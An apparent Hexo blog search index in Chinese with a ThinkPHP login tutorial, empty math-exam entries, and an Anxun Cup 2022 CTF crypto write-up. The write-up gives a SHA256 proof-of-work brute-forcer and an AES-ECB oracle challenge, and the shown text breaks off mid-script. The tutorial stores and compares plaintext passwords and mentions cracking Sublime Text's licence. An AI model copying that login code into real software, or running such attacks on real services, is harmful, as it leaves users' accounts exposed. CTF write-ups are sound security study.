<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从零开始php开发博客软件</title>
      <link href="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6/"/>
      <url>/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-ThinkPHP配置"><a href="#第一章-ThinkPHP配置" class="headerlink" title="第一章 ThinkPHP配置"></a>第一章 ThinkPHP配置</h1><h2 id="1-1-框架下载"><a href="#1-1-框架下载" class="headerlink" title="1.1 框架下载"></a>1.1 框架下载</h2><p><a href="https://www.thinkphp.cn/down.html">https://www.thinkphp.cn/down.html</a></p><p>在tp的官网上下载就行了。下载到本地之后，解压到一个写代码的目录</p><h2 id="1-2-php环境配置"><a href="#1-2-php环境配置" class="headerlink" title="1.2 php环境配置"></a>1.2 php环境配置</h2><p>这里我windows上面，使用phpstudy简单一些，所以我直接用的phpstudy，当然也可以选择使用其他的环境软件如bt等。</p><p>一键启动wnmp即可</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221201184107568.png" alt="image-20221201184107568"></p><p>然后去网站里修改网站的配置，如下：</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221201184146432.png" alt="image-20221201184146432"></p><h2 id="1-3-配置成功"><a href="#1-3-配置成功" class="headerlink" title="1.3 配置成功"></a>1.3 配置成功</h2><p>出现下面的情况就是配置成功了：</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221201184238528.png" alt="image-20221201184238528"></p><h1 id="第二章-thinkPHP框架了解"><a href="#第二章-thinkPHP框架了解" class="headerlink" title="第二章 thinkPHP框架了解"></a>第二章 thinkPHP框架了解</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><p>这里先不必对这个框架做太深入的了解，简单地知道一些怎么写一些代码，这些代码应该放在哪里即可。</p><h2 id="2-2-前后端分离"><a href="#2-2-前后端分离" class="headerlink" title="2.2 前后端分离"></a>2.2 前后端分离</h2><p>可以采用多应用模式，使用下面的命令安装多应用模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-multi-app</span><br></pre></td></tr></table></figure><p>然后把app文件夹下的controller文件夹删除，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php think build index //其中index是要生成的模块，如果要生成admin模块，则将index改成admin。</span><br><span class="line"></span><br><span class="line">php think build admin</span><br></pre></td></tr></table></figure><h2 id="2-3-url问题"><a href="#2-3-url问题" class="headerlink" title="2.3 url问题"></a>2.3 url问题</h2><p>本来这个apache是只能访问index.php和admin.php才能访问到两个应用的，想要通过index和admin访问的话，需要更改public文件夹下面的.htaccess文件的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>就是把<code>index/$1</code>改为了<code>index?s=$1</code>这样就行了。</p><h1 id="第三章-登录界面"><a href="#第三章-登录界面" class="headerlink" title="第三章 登录界面"></a>第三章 登录界面</h1><h2 id="3-1-登录放在哪里"><a href="#3-1-登录放在哪里" class="headerlink" title="3.1 登录放在哪里"></a>3.1 登录放在哪里</h2><p>登录功能，对于博客应用应该是只有admin用户使用该功能。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202005615605.png" alt="image-20221202005615605"></p><p>放在上面这里，此时可以通过<code>http://127.0.0.1/admin/index/login</code>访问得到登录界面，但是这个连接对于我们来说看起来可能会有点长，下面我们使用tp的路由功能来给他变短一些。</p><h2 id="3-2-路由使用"><a href="#3-2-路由使用" class="headerlink" title="3.2 路由使用"></a>3.2 路由使用</h2><p>可以在admin目录下创建route目录，里面创建route.php文件，如下所示</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202013136714.png" alt="image-20221202013136714"></p><p>但是后来我又感觉这样用着不是很舒服，所以可以使用另一种方式。</p><h2 id="3-3-创建Login-php文件"><a href="#3-3-创建Login-php文件" class="headerlink" title="3.3 创建Login.php文件"></a>3.3 创建Login.php文件</h2><p>仿照Index可以直接创建一个Login.php文件，从而也能很舒服地使用这个api</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202013533043.png" alt="image-20221202013533043"></p><p>此时使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/login/</span><br><span class="line">或者</span><br><span class="line">http://127.0.0.1/admin/login/index</span><br></pre></td></tr></table></figure><p>都能访问到这个php界面。</p><h2 id="3-4-视图创建"><a href="#3-4-视图创建" class="headerlink" title="3.4 视图创建"></a>3.4 视图创建</h2><p>先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-view</span><br></pre></td></tr></table></figure><p>整了半天还不知道在哪里写html啊。想在admin这个应用下面写html，需要先在config文件夹下面新建一个admin文件夹，里面放复制的config目录下的view.php文件</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202015056615.png" alt="image-20221202015056615"></p><p>然后再访问登录界面就能看到登录界面的html了</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202020015210.png" alt="image-20221202020015210"></p><p>对于css和js这些静态文件开始是不能访问得到的，需要把视图的静态文件放在public文件夹下面，因为在tp中，只有这个文件夹是可以被直接访问到的，所以最好也不要在这个文件夹下面放重要的文件。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202112109600.png" alt="image-20221202112109600"></p><h2 id="3-5-参数传递"><a href="#3-5-参数传递" class="headerlink" title="3.5 参数传递"></a>3.5 参数传递</h2><p>说到登录功能，就要想到这个用户名和密码的参数怎么传递才好呢。</p><p>这里其实有几种预选方案的，但是好像静态使用最为简单，<a href="https://www.php.cn/phpkj/thinkphp/455012.html">参考链接</a></p><blockquote><p>使用之前先引入use think\facade\Request;</p><p>检测变量是否设置：</p><p>Request::has(‘id’,’get’);A类url和B类url都返回返回ture,C类url和D类url返回false</p><p>Request::has(‘name’,’post’);检测是否有post过来的name，返回ture或者false</p><p>Request::param(‘name’);&#x2F;&#x2F; 获取当前请求的name变量，返回字符串，不传递输出null</p><p>Request::param();&#x2F;&#x2F; 获取当前请求的所有变量（经过过滤）</p><p>Request::param(false);&#x2F;&#x2F; 获取当前请求未经过滤的所有变量</p><p>Request::param([‘name’, ‘email’]);&#x2F;&#x2F; 获取部分变量</p></blockquote><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202120217412.png" alt="image-20221202120217412"></p><p>可以看到已经成功接收到参数</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202120254606.png" alt="image-20221202120254606"></p><h2 id="3-6-数据库使用"><a href="#3-6-数据库使用" class="headerlink" title="3.6 数据库使用"></a>3.6 数据库使用</h2><p>登录涉及到数据库，这里再记录一下怎么使用mysql数据库。</p><h3 id="3-6-1-创建数据库"><a href="#3-6-1-创建数据库" class="headerlink" title="3.6.1 创建数据库"></a>3.6.1 创建数据库</h3><p>首先使用Navicat连接本地的mysql数据库，并创建数据库与数据表，测试数据表格式如下</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202121501875.png" alt="image-20221202121501875"></p><p>随后插入一条测试数据</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202121541624.png" alt="image-20221202121541624"></p><h3 id="3-6-2-tp连接数据库"><a href="#3-6-2-tp连接数据库" class="headerlink" title="3.6.2 tp连接数据库"></a>3.6.2 tp连接数据库</h3><p>首先更改config文件夹下面的database.php文件里面的内容，主要更改的内容就是下面的红框中的内容。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202122100203.png" alt="image-20221202122100203"></p><p>然后删掉.env文件中的数据库的连接配置，不然默认会使用那个文件里面的数据库配置。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202130101287.png" alt="image-20221202130101287"></p><p>然后在使用数据库的页面中添加数据库查询代码。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202130144210.png" alt="image-20221202130144210"></p><p>这样就能和数据库交互了</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202130223542.png" alt="image-20221202130223542"></p><h2 id="3-7-用户名密码验证"><a href="#3-7-用户名密码验证" class="headerlink" title="3.7 用户名密码验证"></a>3.7 用户名密码验证</h2><p>这里使用查询用户名对应密码，然后将数据库中的密码与用户输入的密码对比来进行验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function index(Request $request)</span><br><span class="line">&#123;</span><br><span class="line">    $a = request()-&gt;isGet();</span><br><span class="line">    $username = Request::post(&#x27;username&#x27;, &#x27;&#x27;, null);</span><br><span class="line">    $password = Request::post(&#x27;password&#x27;, &#x27;&#x27;, null);</span><br><span class="line">    $res = $this-&gt;loginVerify($username, $password);</span><br><span class="line">    return view(&#x27;/login&#x27;, [&#x27;res&#x27; =&gt; $res]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 登录验证</span><br><span class="line">public function loginVerify($username, $password)</span><br><span class="line">&#123;</span><br><span class="line">    $a = Db::table(&#x27;user&#x27;)-&gt;where(&#x27;username&#x27;, &#x27;admin&#x27;)-&gt;find();</span><br><span class="line">    $rpass = $a[&#x27;password&#x27;];  //真实的password，也就是数据库中的password</span><br><span class="line">    $upass = $password;  //用户输入的password</span><br><span class="line">    $res = false;</span><br><span class="line">    if ($rpass == $upass) &#123;</span><br><span class="line">        $res = true;</span><br><span class="line">        // code...</span><br><span class="line">    &#125;</span><br><span class="line">    return $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-8-验证码使用"><a href="#3-8-验证码使用" class="headerlink" title="3.8 验证码使用"></a>3.8 验证码使用</h2><h3 id="3-8-1-前端使用"><a href="#3-8-1-前端使用" class="headerlink" title="3.8.1 前端使用"></a>3.8.1 前端使用</h3><p>首先安装模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-captcha</span><br></pre></td></tr></table></figure><p>然后在html界面加上下面的代码就能产生验证码了，<strong>注意自己调整css</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; class=&quot;Captcha&quot; name=&quot;Captcha&quot; placeholder=&quot;验证码&quot; required=&quot;&quot;&gt;</span><br><span class="line">&lt;img src=&quot;login/codecreate&quot; type=&quot;button&quot; id=&quot;code&quot; onClick=&quot;this.src=&#x27;login/codecreate?&#x27;+Math.random();&quot; style=&quot;height:40px;width:150px;margin-top: 25px;float: right;&quot; alt=&quot;captcha&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="3-8-2-后端验证"><a href="#3-8-2-后端验证" class="headerlink" title="3.8.2 后端验证"></a>3.8.2 后端验证</h3><p>修改admin下的中间件，添加session支持。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202152344295.png" alt="image-20221202152344295"></p><p>后台验证码验证逻辑，让重新登录。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202152437459.png" alt="image-20221202152437459"></p><h3 id="3-8-3-验证码格式"><a href="#3-8-3-验证码格式" class="headerlink" title="3.8.3 验证码格式"></a>3.8.3 验证码格式</h3><p>可以在config下的captcha.php文件中调验证码的格式，<strong>此文件为安装验证码插件后自动生成的</strong>。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202152618546.png" alt="image-20221202152618546"></p><h2 id="3-9-登录重构"><a href="#3-9-登录重构" class="headerlink" title="3.9 登录重构"></a>3.9 登录重构</h2><p>最后重构一下，添加上要使用的前端框架，完善后端的登录代码。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="1-sublimeText破解"><a href="#1-sublimeText破解" class="headerlink" title="1.sublimeText破解"></a>1.sublimeText破解</h2><p><a href="https://blog.csdn.net/qq_42280544/article/details/127869606">参考链接</a></p><p>这个软件的注册码太贵了，还想用就需要稍微thick一下。</p><p><img src="/2022/12/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8BthinkPHP%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E8%BD%AF%E4%BB%B6//image-20221202124919765.png" alt="image-20221202124919765"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考研概率</title>
      <link href="/2022/11/30/%E8%80%83%E7%A0%94%E6%A6%82%E7%8E%87/"/>
      <url>/2022/11/30/%E8%80%83%E7%A0%94%E6%A6%82%E7%8E%87/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考研线代</title>
      <link href="/2022/11/30/%E8%80%83%E7%A0%94%E7%BA%BF%E4%BB%A3/"/>
      <url>/2022/11/30/%E8%80%83%E7%A0%94%E7%BA%BF%E4%BB%A3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考研高数</title>
      <link href="/2022/11/30/%E8%80%83%E7%A0%94%E9%AB%98%E6%95%B0/"/>
      <url>/2022/11/30/%E8%80%83%E7%A0%94%E9%AB%98%E6%95%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2022密码方向题解</title>
      <link href="/2022/11/27/%E5%AE%89%E6%B4%B5%E6%9D%AF2022%E5%AF%86%E7%A0%81%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/11/27/%E5%AE%89%E6%B4%B5%E6%9D%AF2022%E5%AF%86%E7%A0%81%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Cry1"><a href="#1-Cry1" class="headerlink" title="1. Cry1"></a>1. Cry1</h3><p>没什么好说的，就过个sha256然后猜数字就行了。贴个bypass sha256的代码，数字手动猜：</p><p>solve</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteSha256</span>(<span class="params">S256data1, S256data2</span>):</span><br><span class="line">    dic = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">                    xxxx = i+j+a+b</span><br><span class="line">                    tmp1 = xxxx + S256data1</span><br><span class="line">                    tmp2 = sha256(tmp1.encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> tmp2 == S256data2:</span><br><span class="line">                        <span class="built_in">print</span>(xxxx)</span><br><span class="line">                        <span class="keyword">return</span> xxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    client = remote(<span class="string">&#x27;120.78.131.38&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    S256data1 = <span class="built_in">str</span>(data)[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">print</span>(S256data1)</span><br><span class="line">    S256data2 = <span class="built_in">str</span>(data)[<span class="number">34</span>:-<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(S256data2)</span><br><span class="line">    xxxx = bruteSha256(S256data1, S256data2)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    client.sendline(xxxx.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure><p><img src="/2022/11/27/%E5%AE%89%E6%B4%B5%E6%9D%AF2022%E5%AF%86%E7%A0%81%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3//image-20221127160006984.png" alt="image-20221127160006984"></p><h3 id="2-Cry2"><a href="#2-Cry2" class="headerlink" title="2. Cry2"></a>2. Cry2</h3><p>problem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;D0g3&#123;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyServer</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()</span><br><span class="line">        self.request.sendall((<span class="string">&#x27;SHA256(XXXX + %s):%s\n&#x27;</span> % (random_str[<span class="number">4</span>:], str_sha256)).encode())</span><br><span class="line">        self.request.sendall(<span class="string">&#x27;Give Me XXXX:\n&#x27;</span>.encode())</span><br><span class="line">        XXXX = self.request.recv(<span class="number">2048</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((XXXX + random_str[<span class="number">4</span>:].encode())).hexdigest() != str_sha256:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">self, message</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(message) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> message.ljust((<span class="built_in">len</span>(message) // <span class="number">16</span> + <span class="number">1</span>) * <span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>).encode()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> message.encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, key, message</span>):</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, key, message</span>):</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">return</span> aes.decrypt(message)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof():</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;Error Hash!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        flag1, flag2 = flag[:<span class="number">8</span>], flag[<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.request.sendall(<span class="string">&#x27;You can input anything:\n&#x27;</span>.encode())</span><br><span class="line">            iMessage = self.request.recv(<span class="number">2048</span>).strip().decode()</span><br><span class="line">            message = self.pad(flag1 + iMessage + flag2)</span><br><span class="line">            cipher = binascii.hexlify(self.encrypt(flag2.encode(), message))</span><br><span class="line">            self.request.sendall((<span class="string">&#x27;Here is your cipher: %s\n&#x27;</span> % cipher).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sever = socketserver.ThreadingTCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10086</span>), MyServer)</span><br><span class="line">    sever.serve_forever()</span><br></pre></td></tr></table></figure><p>显然可以直接拼接爆破出后面flag2的内容，简单的ECB pattern的小trick。</p><blockquote><p>ECB模式下</p><ol><li><p>若明文相同，那么加密后的密文也相同。</p></li><li><p>加解密的单位是16Bytes，就是16个ascii（其实包括的还有&gt;128并且&lt;256的一些其他字符）</p></li></ol></blockquote><p>cryptohack上面有道相似的题目。</p><p>solve</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 